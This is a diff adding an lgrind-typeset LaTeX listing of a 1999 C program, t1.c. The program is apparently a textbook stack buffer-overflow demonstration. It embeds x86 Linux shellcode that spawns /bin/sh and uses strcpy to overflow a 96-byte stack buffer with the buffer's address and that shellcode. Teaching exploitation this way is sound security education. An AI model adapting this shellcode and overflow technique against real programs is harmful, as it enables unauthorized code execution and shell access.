@@ -1,0 +1,26 @@
+% Remember to use the lgrind style
+
+\Head{}
+\File{t1.c}{1999}{Dec}{10}{16:58}{515}
+\L{\LB{\K{\#include}_\<\V{stdio}.\V{h}\>}}
+\L{\LB{}}
+\L{\LB{\K{char}_\V{shellcode}[\,]_=}}
+\L{\LB{___\S{}\3\2xeb\2x1f\2x5e\2x89\2x76\2x08\2x31\2xc0\2x88\2x46\2x07\2x89\2x46\2x0c\2xb0\2x0b\3\SE{}}}
+\L{\LB{___\S{}\3\2x89\2xf3\2x8d\2x4e\2x08\2x8d\2x56\2x0c\2xcd\2x80\2x31\2xdb\2x89\2xd8\2x40\2xcd\3\SE{}}}
+\L{\LB{___\S{}\3\2x80\2xe8\2xdc\2xff\2xff\2xff\1bin\1sh\3\SE{};}}
+\L{\LB{}}
+\L{\LB{\K{char}_\V{large\_string}[\N{128}];}}
+\L{\LB{\K{int}_\V{i};}}
+\L{\LB{\K{long}_\*\V{long\_ptr};}}
+\L{\LB{}}
+\L{\LB{\Proc{main}\K{int}_\V{main}()_\{}}
+\L{\LB{__\K{char}_\V{buffer}[\N{96}];}}
+\L{\LB{}}
+\L{\LB{__\V{long\_ptr}_=_(\K{long}_\*)\V{large\_string};}}
+\L{\LB{__\K{for}_(\V{i}=\N{0};_\V{i}\<\N{32};_\V{i}++)}}
+\L{\LB{____\*(\V{long\_ptr}+\V{i})_=_(\K{int})\V{buffer};}}
+\L{\LB{__\K{for}_(\V{i}=\N{0};_\V{i}\<(\K{int})\V{strlen}(\V{shellcode});_\V{i}++)}}
+\L{\LB{____\V{large\_string}[\V{i}]_=_\V{shellcode}[\V{i}];}}
+\L{\LB{__\V{strcpy}(\V{buffer},_\V{large\_string});}}
+\L{\LB{__\K{return}_\N{0};}}
+\L{\LB{\}}}
